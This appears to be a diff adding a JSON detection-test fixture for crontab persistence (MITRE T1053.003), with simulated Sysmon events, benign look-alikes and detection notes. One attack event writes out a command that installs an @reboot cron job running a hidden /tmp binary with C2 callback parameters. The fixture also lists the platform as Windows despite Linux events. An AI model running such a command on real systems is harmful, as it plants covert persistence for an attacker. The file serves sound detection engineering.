@@ -1,0 +1,237 @@
+{
+  "technique_id": "T1053.003",
+  "technique_name": "Detection for T1053.003 — Add crontab entry (Linux)",
+  "description": "Simulates Detection for T1053.003 — Add crontab entry (Linux) attack sequence",
+  "mitre_tactic": "unknown",
+  "events": {
+    "attack_sequence": [
+      {
+        "@timestamp": "2026-03-22T09:14:22.413Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 7741,
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "command_line": "crontab -l",
+          "parent": {
+            "pid": 7739,
+            "name": "bash",
+            "executable": "/bin/bash"
+          }
+        },
+        "user": {
+          "name": "mjones",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-EXEC-01",
+          "os": {
+            "platform": "linux"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1053.003",
+          "sequence_order": 1,
+          "sequence_total": 3,
+          "description": "Adversary enumerates existing crontab entries before injecting malicious job"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T09:14:35.887Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 7758,
+          "name": "bash",
+          "executable": "/bin/bash",
+          "command_line": "bash -c \"(crontab -l 2>/dev/null; echo '@reboot /tmp/.sync_agent -c /dev/null -s 192.168.45.10 -p 4444 &') | crontab -\"",
+          "parent": {
+            "pid": 7739,
+            "name": "bash",
+            "executable": "/bin/bash"
+          }
+        },
+        "user": {
+          "name": "mjones",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-EXEC-01",
+          "os": {
+            "platform": "linux"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1053.003",
+          "sequence_order": 2,
+          "sequence_total": 3,
+          "description": "Adversary injects malicious @reboot crontab entry pointing to dropped payload with C2 callback parameters; uses subshell pattern to preserve existing cron jobs while appending"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T09:14:36.204Z",
+        "event": {
+          "category": "file",
+          "type": "creation",
+          "action": "File Create (rule: FileCreate)",
+          "code": "11"
+        },
+        "file": {
+          "name": "mjones",
+          "path": "/var/spool/cron/crontabs/mjones",
+          "extension": ""
+        },
+        "process": {
+          "pid": 7759,
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "command_line": "crontab -",
+          "parent": {
+            "pid": 7758,
+            "name": "bash",
+            "executable": "/bin/bash"
+          }
+        },
+        "user": {
+          "name": "mjones",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-EXEC-01",
+          "os": {
+            "platform": "linux"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1053.003",
+          "sequence_order": 3,
+          "sequence_total": 3,
+          "description": "Crontab daemon writes updated crontab file to spool directory containing the malicious @reboot persistence entry"
+        }
+      }
+    ],
+    "benign_similar": [
+      {
+        "@timestamp": "2026-03-22T08:02:11.549Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 6103,
+          "name": "bash",
+          "executable": "/bin/bash",
+          "command_line": "bash -c \"(crontab -l 2>/dev/null; echo '0 3 * * 0 /opt/scripts/weekly_backup.sh >> /var/log/backup.log 2>&1') | crontab -\"",
+          "parent": {
+            "pid": 6101,
+            "name": "bash",
+            "executable": "/bin/bash"
+          }
+        },
+        "user": {
+          "name": "mjones",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-EXEC-01",
+          "os": {
+            "platform": "linux"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "benign_similar",
+          "technique": "T1053.003",
+          "description": "Legitimate admin scheduling weekly backup via same crontab subshell append pattern — superficially identical structure to attack event but targets /opt/scripts path, uses timed schedule (not @reboot), and writes to a named log file with no network parameters"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T07:45:00.001Z",
+        "event": {
+          "category": "file",
+          "type": "creation",
+          "action": "File Create (rule: FileCreate)",
+          "code": "11"
+        },
+        "file": {
+          "name": "root",
+          "path": "/var/spool/cron/crontabs/root",
+          "extension": ""
+        },
+        "process": {
+          "pid": 3812,
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "command_line": "crontab /etc/cron.d/system-maintenance",
+          "parent": {
+            "pid": 3810,
+            "name": "ansible-playbook",
+            "executable": "/usr/bin/ansible-playbook"
+          }
+        },
+        "user": {
+          "name": "root",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-EXEC-01",
+          "os": {
+            "platform": "linux"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "benign_similar",
+          "technique": "T1053.003",
+          "description": "Ansible configuration management task deploying standard system maintenance crontab — cron spool file write by root with ansible-playbook as parent is consistent with scheduled IT automation; no suspicious schedule specifier or hidden binary path"
+        }
+      }
+    ]
+  },
+  "expected_detection": {
+    "should_alert_on": "attack_sequence",
+    "should_not_alert_on": "benign_similar",
+    "key_fields": [
+      "process.name",
+      "process.command_line",
+      "process.parent.name",
+      "file.path",
+      "user.name"
+    ],
+    "notes": "Detection should focus on: (1) crontab command_line containing @reboot or non-standard schedule specifiers combined with paths under /tmp, /dev/shm, or dot-prefixed hidden files; (2) crontab -l followed rapidly by crontab - from same parent PID (enumeration then write); (3) command_line parameters suggestive of C2 (IP:port flags, -c /dev/null, &-backgrounding). Benign crontab writes are common but typically originate from /opt, /usr/local/scripts, or configuration management parents (ansible, puppet, chef). Key FP suppression: exclude parent.name in (ansible-playbook, puppet-agent, chef-client) and file paths matching /opt/* or /usr/local/*."
+  },
+  "log_sources_used": [
+    "sysmon_linux_1",
+    "sysmon_linux_11"
+  ],
+  "platforms": [
+    "windows"
+  ]
+}
